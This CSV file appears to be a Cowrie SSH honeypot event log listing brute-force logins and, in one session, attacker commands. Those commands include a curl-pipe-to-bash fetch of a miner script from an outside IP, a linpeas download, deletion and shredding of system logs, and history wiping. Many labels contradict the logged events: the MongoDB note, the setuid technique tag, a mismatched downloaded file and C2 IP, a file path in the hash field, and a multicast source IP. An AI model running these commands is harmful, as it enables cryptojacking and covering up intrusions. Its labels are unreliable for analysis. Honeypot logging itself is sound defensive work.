event_id,session_id,timestamp,event_type,honeypot_id,src_ip,src_port,dst_ip,dst_port,protocol,username,password,login_success,command,command_index,country,asn,isp,attack_type,mitre_technique_id,mitre_technique_name,severity,file_downloaded,c2_ip,sha256_payload,session_duration_sec,bytes_sent,bytes_received,alert_tag,false_positive,thehive_case_id,misp_event_uuid,analyst_note
EVT-0002015,060e4e212dda,2026-04-23T21:13:12.618Z,cowrie.command.input,cowrie-ec2-prod-01,4.237.94.21,48528,172.18.0.3,2222,ssh,hadoop,toor,true,sysctl -a 2>/dev/null | grep -i 'net\|kernel',6,UA,AS6849,JSC Ukrtelecom,tool_download,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,high,,,,,,,privilege_escalation,false,,,MongoDB credential extraction attempt
EVT-0002016,060e4e212dda,2026-04-23T21:13:28.243Z,cowrie.command.input,cowrie-ec2-prod-01,4.237.94.21,48528,172.18.0.3,2222,ssh,hadoop,toor,true,df -h,7,UA,AS6849,JSC Ukrtelecom,tool_download,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,high,,,,,,,privilege_escalation,false,,,MongoDB credential extraction attempt
EVT-0002017,060e4e212dda,2026-04-23T21:13:34.482Z,cowrie.command.input,cowrie-ec2-prod-01,4.237.94.21,48528,172.18.0.3,2222,ssh,hadoop,toor,true,curl -s http://45.142.212.100/miner.sh | bash,8,UA,AS6849,JSC Ukrtelecom,tool_download,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,high,,,,,,,privilege_escalation,false,,,MongoDB credential extraction attempt
EVT-0002018,060e4e212dda,2026-04-23T21:13:39.649Z,cowrie.command.input,cowrie-ec2-prod-01,4.237.94.21,48528,172.18.0.3,2222,ssh,hadoop,toor,true,wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh,9,UA,AS6849,JSC Ukrtelecom,tool_download,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,high,backdoor.elf,194.165.16.78,var/lib/cowrie/downloads/fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9,,,,privilege_escalation,false,,,MongoDB credential extraction attempt
EVT-0002019,060e4e212dda,2026-04-23T21:13:46.066Z,cowrie.command.input,cowrie-ec2-prod-01,4.237.94.21,48528,172.18.0.3,2222,ssh,hadoop,toor,true,rm -f ~/.bash_history,10,UA,AS6849,JSC Ukrtelecom,tool_download,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,high,,,,,,,privilege_escalation,false,,,MongoDB credential extraction attempt
EVT-0002020,060e4e212dda,2026-04-23T21:13:47.726Z,cowrie.session.file_upload,cowrie-ec2-prod-01,4.237.94.21,48528,172.18.0.3,2222,ssh,hadoop,toor,true,,,UA,AS6849,JSC Ukrtelecom,tool_download,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,high,scan.py,185.220.101.42,var/lib/cowrie/downloads/1c8aff950685c2ed4bc3174f3472607b2c9a1b3b3c77ecc855cfa6e3d73ebc1,,,,privilege_escalation,false,,,MongoDB credential extraction attempt
EVT-0002021,060e4e212dda,2026-04-23T21:13:53.505Z,cowrie.command.input,cowrie-ec2-prod-01,4.237.94.21,48528,172.18.0.3,2222,ssh,hadoop,toor,true,pkill -f 'sshd: root',11,UA,AS6849,JSC Ukrtelecom,tool_download,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,high,,,,,,,privilege_escalation,false,,,MongoDB credential extraction attempt
EVT-0002022,060e4e212dda,2026-04-23T21:13:55.469Z,cowrie.command.input,cowrie-ec2-prod-01,4.237.94.21,48528,172.18.0.3,2222,ssh,hadoop,toor,true,rm -rf /var/log/syslog,12,UA,AS6849,JSC Ukrtelecom,tool_download,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,high,,,,,,,privilege_escalation,false,,,MongoDB credential extraction attempt
EVT-0002023,060e4e212dda,2026-04-23T21:14:11.419Z,cowrie.command.input,cowrie-ec2-prod-01,4.237.94.21,48528,172.18.0.3,2222,ssh,hadoop,toor,true,shred -u /var/log/auth.log,13,UA,AS6849,JSC Ukrtelecom,tool_download,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,high,,,,,,,privilege_escalation,false,,,MongoDB credential extraction attempt
EVT-0002024,060e4e212dda,2026-04-23T21:14:22.345Z,cowrie.command.input,cowrie-ec2-prod-01,4.237.94.21,48528,172.18.0.3,2222,ssh,hadoop,toor,true,export HISTFILESIZE=0,14,UA,AS6849,JSC Ukrtelecom,tool_download,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,high,,,,,,,privilege_escalation,false,,,MongoDB credential extraction attempt
EVT-0002025,060e4e212dda,2026-04-23T21:14:40.975Z,cowrie.command.input,cowrie-ec2-prod-01,4.237.94.21,48528,172.18.0.3,2222,ssh,hadoop,toor,true,unset HISTFILE,15,UA,AS6849,JSC Ukrtelecom,tool_download,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,high,,,,,,,privilege_escalation,false,,,MongoDB credential extraction attempt
EVT-0002026,060e4e212dda,2026-04-23T21:14:55.281Z,cowrie.command.input,cowrie-ec2-prod-01,4.237.94.21,48528,172.18.0.3,2222,ssh,hadoop,toor,true,disconnect,16,UA,AS6849,JSC Ukrtelecom,tool_download,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,high,,,,,,,privilege_escalation,false,,,MongoDB credential extraction attempt
EVT-0002027,060e4e212dda,2026-04-23T21:14:57.001Z,cowrie.session.closed,cowrie-ec2-prod-01,4.237.94.21,48528,172.18.0.3,2222,ssh,hadoop,toor,true,,,UA,AS6849,JSC Ukrtelecom,tool_download,T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,high,,,,105,85002,5041,privilege_escalation,false,,,MongoDB credential extraction attempt
EVT-0002028,8a4c5038a95c,2026-04-06T13:04:29.000Z,cowrie.session.connect,cowrie-ec2-prod-01,190.181.248.114,47208,172.18.0.3,2222,ssh,,,,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0002029,8a4c5038a95c,2026-04-06T13:04:29.117Z,cowrie.client.version,cowrie-ec2-prod-01,190.181.248.114,47208,172.18.0.3,2222,ssh,,,,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0002030,8a4c5038a95c,2026-04-06T13:04:29.263Z,cowrie.client.kex,cowrie-ec2-prod-01,190.181.248.114,47208,172.18.0.3,2222,ssh,,,,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0002031,8a4c5038a95c,2026-04-06T13:04:30.164Z,cowrie.login.failed,cowrie-ec2-prod-01,190.181.248.114,47208,172.18.0.3,2222,ssh,hadoop,1q2w3e4r,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0002032,8a4c5038a95c,2026-04-06T13:04:33.059Z,cowrie.login.failed,cowrie-ec2-prod-01,190.181.248.114,47208,172.18.0.3,2222,ssh,manager,123456789,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0002033,8a4c5038a95c,2026-04-06T13:04:35.304Z,cowrie.login.failed,cowrie-ec2-prod-01,190.181.248.114,47208,172.18.0.3,2222,ssh,support,master,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0002034,8a4c5038a95c,2026-04-06T13:04:36.560Z,cowrie.login.failed,cowrie-ec2-prod-01,190.181.248.114,47208,172.18.0.3,2222,ssh,ubuntu,654321,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0002035,8a4c5038a95c,2026-04-06T13:04:37.260Z,cowrie.login.failed,cowrie-ec2-prod-01,190.181.248.114,47208,172.18.0.3,2222,ssh,db,admin,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0002036,8a4c5038a95c,2026-04-06T13:04:39.663Z,cowrie.login.failed,cowrie-ec2-prod-01,190.181.248.114,47208,172.18.0.3,2222,ssh,hadoop,12345678,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0002037,8a4c5038a95c,2026-04-06T13:04:40.723Z,cowrie.login.failed,cowrie-ec2-prod-01,190.181.248.114,47208,172.18.0.3,2222,ssh,git,osmc,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0002038,8a4c5038a95c,2026-04-06T13:04:41.509Z,cowrie.login.failed,cowrie-ec2-prod-01,190.181.248.114,47208,172.18.0.3,2222,ssh,manager,12345678,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0002039,8a4c5038a95c,2026-04-06T13:04:45.750Z,cowrie.session.closed,cowrie-ec2-prod-01,190.181.248.114,47208,172.18.0.3,2222,ssh,manager,12345678,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,25,469,1034,bruteforce,false,,,
EVT-0002040,aa64f5386807,2026-03-10T01:59:18.000Z,cowrie.session.connect,cowrie-ec2-prod-01,164.225.226.251,65067,172.18.0.3,2222,ssh,,,,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0002041,aa64f5386807,2026-03-10T01:59:18.415Z,cowrie.client.version,cowrie-ec2-prod-01,164.225.226.251,65067,172.18.0.3,2222,ssh,,,,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0002042,aa64f5386807,2026-03-10T01:59:19.000Z,cowrie.client.kex,cowrie-ec2-prod-01,164.225.226.251,65067,172.18.0.3,2222,ssh,,,,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0002043,aa64f5386807,2026-03-10T01:59:20.160Z,cowrie.login.failed,cowrie-ec2-prod-01,164.225.226.251,65067,172.18.0.3,2222,ssh,nagios,P@ssw0rd,false,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0002044,aa64f5386807,2026-03-10T01:59:20.805Z,cowrie.login.failed,cowrie-ec2-prod-01,164.225.226.251,65067,172.18.0.3,2222,ssh,mysql,libreelec,false,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0002045,aa64f5386807,2026-03-10T01:59:22.834Z,cowrie.login.failed,cowrie-ec2-prod-01,164.225.226.251,65067,172.18.0.3,2222,ssh,www,qwerty,false,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0002046,aa64f5386807,2026-03-10T01:59:23.600Z,cowrie.login.failed,cowrie-ec2-prod-01,164.225.226.251,65067,172.18.0.3,2222,ssh,ec2-user,system,false,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0002047,aa64f5386807,2026-03-10T01:59:26.180Z,cowrie.session.closed,cowrie-ec2-prod-01,164.225.226.251,65067,172.18.0.3,2222,ssh,ec2-user,system,false,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,17,290,377,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0002048,d7e5fc9f2fe4,2026-03-22T10:46:08.000Z,cowrie.session.connect,cowrie-ec2-prod-01,216.47.229.129,60578,172.18.0.3,2222,ssh,,,,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0002049,d7e5fc9f2fe4,2026-03-22T10:46:08.305Z,cowrie.client.version,cowrie-ec2-prod-01,216.47.229.129,60578,172.18.0.3,2222,ssh,,,,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0002050,d7e5fc9f2fe4,2026-03-22T10:46:08.513Z,cowrie.client.kex,cowrie-ec2-prod-01,216.47.229.129,60578,172.18.0.3,2222,ssh,,,,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0002051,d7e5fc9f2fe4,2026-03-22T10:46:09.440Z,cowrie.login.failed,cowrie-ec2-prod-01,216.47.229.129,60578,172.18.0.3,2222,ssh,centos,P@ssw0rd,false,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0002052,d7e5fc9f2fe4,2026-03-22T10:46:11.544Z,cowrie.session.closed,cowrie-ec2-prod-01,216.47.229.129,60578,172.18.0.3,2222,ssh,centos,P@ssw0rd,false,,,BR,AS28573,Claro NXT Telecomunicacoes,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,15,1889,923,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0002053,5f30531e92b5,2026-03-11T06:36:21.000Z,cowrie.session.connect,cowrie-ec2-prod-01,228.62.91.72,47023,172.18.0.3,2222,ssh,,,,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Part of distributed brute-force campaign
EVT-0002054,5f30531e92b5,2026-03-11T06:36:21.345Z,cowrie.client.version,cowrie-ec2-prod-01,228.62.91.72,47023,172.18.0.3,2222,ssh,,,,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Part of distributed brute-force campaign
EVT-0002055,5f30531e92b5,2026-03-11T06:36:21.765Z,cowrie.client.kex,cowrie-ec2-prod-01,228.62.91.72,47023,172.18.0.3,2222,ssh,,,,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Part of distributed brute-force campaign
EVT-0002056,5f30531e92b5,2026-03-11T06:36:24.079Z,cowrie.login.failed,cowrie-ec2-prod-01,228.62.91.72,47023,172.18.0.3,2222,ssh,administrator,toor,false,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Part of distributed brute-force campaign
EVT-0002057,5f30531e92b5,2026-03-11T06:36:26.541Z,cowrie.login.failed,cowrie-ec2-prod-01,228.62.91.72,47023,172.18.0.3,2222,ssh,ubuntu,P@ssw0rd,false,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Part of distributed brute-force campaign
EVT-0002058,5f30531e92b5,2026-03-11T06:36:27.685Z,cowrie.login.failed,cowrie-ec2-prod-01,228.62.91.72,47023,172.18.0.3,2222,ssh,www,passw0rd,false,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Part of distributed brute-force campaign
EVT-0002059,5f30531e92b5,2026-03-11T06:36:28.410Z,cowrie.login.failed,cowrie-ec2-prod-01,228.62.91.72,47023,172.18.0.3,2222,ssh,admin,dietpi,false,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Part of distributed brute-force campaign
EVT-0002060,5f30531e92b5,2026-03-11T06:36:29.659Z,cowrie.login.failed,cowrie-ec2-prod-01,228.62.91.72,47023,172.18.0.3,2222,ssh,debian,root123,false,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Part of distributed brute-force campaign
EVT-0002061,5f30531e92b5,2026-03-11T06:36:32.265Z,cowrie.login.failed,cowrie-ec2-prod-01,228.62.91.72,47023,172.18.0.3,2222,ssh,mysql,P@ssw0rd,false,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Part of distributed brute-force campaign
EVT-0002062,5f30531e92b5,2026-03-11T06:36:36.543Z,cowrie.session.closed,cowrie-ec2-prod-01,228.62.91.72,47023,172.18.0.3,2222,ssh,mysql,P@ssw0rd,false,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,12,1243,741,bruteforce,false,,,Part of distributed brute-force campaign
EVT-0002063,9ba982693953,2026-04-09T21:12:34.000Z,cowrie.session.connect,cowrie-ec2-prod-01,141.13.181.231,46303,172.18.0.3,2222,ssh,,,,,,CN,AS9808,China Mobile,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0002064,9ba982693953,2026-04-09T21:12:34.402Z,cowrie.client.version,cowrie-ec2-prod-01,141.13.181.231,46303,172.18.0.3,2222,ssh,,,,,,CN,AS9808,China Mobile,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0002065,9ba982693953,2026-04-09T21:12:35.374Z,cowrie.client.kex,cowrie-ec2-prod-01,141.13.181.231,46303,172.18.0.3,2222,ssh,,,,,,CN,AS9808,China Mobile,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0002066,9ba982693953,2026-04-09T21:12:37.842Z,cowrie.login.failed,cowrie-ec2-prod-01,141.13.181.231,46303,172.18.0.3,2222,ssh,nagios,oracle,false,,,CN,AS9808,China Mobile,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0002067,9ba982693953,2026-04-09T21:12:40.000Z,cowrie.login.failed,cowrie-ec2-prod-01,141.13.181.231,46303,172.18.0.3,2222,ssh,redis,888888,false,,,CN,AS9808,China Mobile,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0002068,9ba982693953,2026-04-09T21:12:41.169Z,cowrie.login.failed,cowrie-ec2-prod-01,141.13.181.231,46303,172.18.0.3,2222,ssh,ansible,mysql,false,,,CN,AS9808,China Mobile,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0002069,9ba982693953,2026-04-09T21:12:42.229Z,cowrie.login.failed,cowrie-ec2-prod-01,141.13.181.231,46303,172.18.0.3,2222,ssh,operator,system,false,,,CN,AS9808,China Mobile,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0002070,9ba982693953,2026-04-09T21:12:43.469Z,cowrie.login.failed,cowrie-ec2-prod-01,141.13.181.231,46303,172.18.0.3,2222,ssh,administrator,root,false,,,CN,AS9808,China Mobile,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0002071,9ba982693953,2026-04-09T21:12:44.823Z,cowrie.login.failed,cowrie-ec2-prod-01,141.13.181.231,46303,172.18.0.3,2222,ssh,vagrant,default,false,,,CN,AS9808,China Mobile,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0002072,9ba982693953,2026-04-09T21:12:48.512Z,cowrie.session.closed,cowrie-ec2-prod-01,141.13.181.231,46303,172.18.0.3,2222,ssh,vagrant,default,false,,,CN,AS9808,China Mobile,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,20,939,630,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0002073,b029b73ab76a,2026-03-11T05:58:18.000Z,cowrie.session.connect,cowrie-ec2-prod-01,84.176.221.115,48123,172.18.0.3,2222,ssh,,,,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,
EVT-0002074,b029b73ab76a,2026-03-11T05:58:18.132Z,cowrie.client.version,cowrie-ec2-prod-01,84.176.221.115,48123,172.18.0.3,2222,ssh,,,,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,
EVT-0002075,b029b73ab76a,2026-03-11T05:58:18.521Z,cowrie.client.kex,cowrie-ec2-prod-01,84.176.221.115,48123,172.18.0.3,2222,ssh,,,,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,
EVT-0002076,b029b73ab76a,2026-03-11T05:58:20.417Z,cowrie.login.failed,cowrie-ec2-prod-01,84.176.221.115,48123,172.18.0.3,2222,ssh,ansible,osmc,false,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,
EVT-0002077,b029b73ab76a,2026-03-11T05:58:23.076Z,cowrie.login.failed,cowrie-ec2-prod-01,84.176.221.115,48123,172.18.0.3,2222,ssh,oracle,Admin@123,false,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,
EVT-0002078,b029b73ab76a,2026-03-11T05:58:24.116Z,cowrie.login.failed,cowrie-ec2-prod-01,84.176.221.115,48123,172.18.0.3,2222,ssh,hadoop,admin@123,false,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,
EVT-0002079,b029b73ab76a,2026-03-11T05:58:25.541Z,cowrie.login.failed,cowrie-ec2-prod-01,84.176.221.115,48123,172.18.0.3,2222,ssh,debian,default,false,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,
EVT-0002080,b029b73ab76a,2026-03-11T05:58:26.897Z,cowrie.login.failed,cowrie-ec2-prod-01,84.176.221.115,48123,172.18.0.3,2222,ssh,test,alpine,false,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,
EVT-0002081,b029b73ab76a,2026-03-11T05:58:27.692Z,cowrie.login.failed,cowrie-ec2-prod-01,84.176.221.115,48123,172.18.0.3,2222,ssh,oracle,666666,false,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,
EVT-0002082,b029b73ab76a,2026-03-11T05:58:31.401Z,cowrie.session.closed,cowrie-ec2-prod-01,84.176.221.115,48123,172.18.0.3,2222,ssh,oracle,666666,false,,,HK,AS4760,HKT Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,6,2937,1401,bruteforce,false,,,
EVT-0002083,5285a6adce6e,2026-04-01T06:53:57.000Z,cowrie.session.connect,cowrie-ec2-prod-01,152.84.5.149,60458,172.18.0.3,2222,ssh,,,,,,MX,AS8151,Uninet S.A. de C.V.,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,true,,,
EVT-0002084,5285a6adce6e,2026-04-01T06:53:57.115Z,cowrie.client.version,cowrie-ec2-prod-01,152.84.5.149,60458,172.18.0.3,2222,ssh,,,,,,MX,AS8151,Uninet S.A. de C.V.,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,true,,,
EVT-0002085,5285a6adce6e,2026-04-01T06:53:57.888Z,cowrie.client.kex,cowrie-ec2-prod-01,152.84.5.149,60458,172.18.0.3,2222,ssh,,,,,,MX,AS8151,Uninet S.A. de C.V.,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,true,,,
EVT-0002086,5285a6adce6e,2026-04-01T06:53:58.718Z,cowrie.login.failed,cowrie-ec2-prod-01,152.84.5.149,60458,172.18.0.3,2222,ssh,ftp,default,false,,,MX,AS8151,Uninet S.A. de C.V.,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,true,,,
EVT-0002087,5285a6adce6e,2026-04-01T06:54:00.101Z,cowrie.login.failed,cowrie-ec2-prod-01,152.84.5.149,60458,172.18.0.3,2222,ssh,centos,12345,false,,,MX,AS8151,Uninet S.A. de C.V.,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,true,,,
EVT-0002088,5285a6adce6e,2026-04-01T06:54:03.674Z,cowrie.session.closed,cowrie-ec2-prod-01,152.84.5.149,60458,172.18.0.3,2222,ssh,centos,12345,false,,,MX,AS8151,Uninet S.A. de C.V.,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,15,1145,1416,bruteforce,true,,,
EVT-0002089,da7b88556774,2026-04-12T10:21:07.000Z,cowrie.session.connect,cowrie-ec2-prod-01,199.60.12.100,56237,172.18.0.3,2222,ssh,,,,,,MA,AS36903,Maroc Telecom,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0002090,da7b88556774,2026-04-12T10:21:07.248Z,cowrie.client.version,cowrie-ec2-prod-01,199.60.12.100,56237,172.18.0.3,2222,ssh,,,,,,MA,AS36903,Maroc Telecom,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0002091,da7b88556774,2026-04-12T10:21:07.762Z,cowrie.client.kex,cowrie-ec2-prod-01,199.60.12.100,56237,172.18.0.3,2222,ssh,,,,,,MA,AS36903,Maroc Telecom,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0002092,da7b88556774,2026-04-12T10:21:08.516Z,cowrie.login.failed,cowrie-ec2-prod-01,199.60.12.100,56237,172.18.0.3,2222,ssh,jenkins,666666,false,,,MA,AS36903,Maroc Telecom,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0002093,da7b88556774,2026-04-12T10:21:09.123Z,cowrie.login.failed,cowrie-ec2-prod-01,199.60.12.100,56237,172.18.0.3,2222,ssh,db,abc123,false,,,MA,AS36903,Maroc Telecom,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
